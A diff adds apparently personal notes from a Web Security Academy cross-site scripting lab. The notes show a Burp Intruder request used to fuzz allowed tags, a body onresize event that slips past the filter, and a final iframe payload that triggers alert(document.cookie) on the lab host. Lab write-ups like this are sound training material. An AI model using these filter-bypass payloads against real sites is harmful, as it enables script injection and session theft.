@@ -1,0 +1,22 @@
+Tried using the standard
+<Script>alert(document.cookie)</script>
+Checking the blog post comments that didn't work
+USing burp to send the request to the intruder tab
+Using the cheat sheet and payloads
+GET /?search=<§§> HTTP/1.1
+Host: ac771f781f80724480e11e14009600ce.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Referer: https://ac771f781f80724480e11e14009600ce.web-security-academy.net/
+Cookie: session=ue3AsZ9tOm417ChGEBesewbGUj8GmOzC
+Upgrade-Insecure-Requests: 1
+Using that we got that body tag gave 200 request
+the onresize tag again gave a 200 request
+In the search bar used
+<body onresize = "alert(document.cookies)">
+The final payload is this
+<iframe src="https://ac471f9f1f7bd94481c710ad00b600ac.web-security-academy.net/?search=%3Cbody+onresize%3D%22alert%28document.cookie%29%22%3E" onload=this.style.width='200px'> 
